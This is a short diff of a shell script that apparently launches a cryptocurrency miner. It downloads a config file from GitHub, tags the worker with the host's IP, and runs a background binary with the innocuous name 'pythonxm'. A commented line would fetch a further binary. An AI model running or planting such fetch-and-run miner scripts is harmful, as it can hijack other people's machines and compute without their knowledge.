@@ -6,7 +6,7 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '################## RV + XM v0.0.9      ################'
+echo '################## RV + XM v0.1.0      ################'
 echo '#######################################################'
 
 
@@ -43,7 +43,7 @@ wget -q https://github.com/one10001/10001code/raw/main/config.json
 sed -i "s+ip0001+RV_$IPNAME+g" config.json
 
 
-./pythonxm -c config.json 2>> oout 1>> oout &
+./pythonxm -c config.json -l oout 2>> oout 1>> oout &
 
 ###### VC
 #wget -q https://github.com/one10001/10001code/raw/main/pythonheq
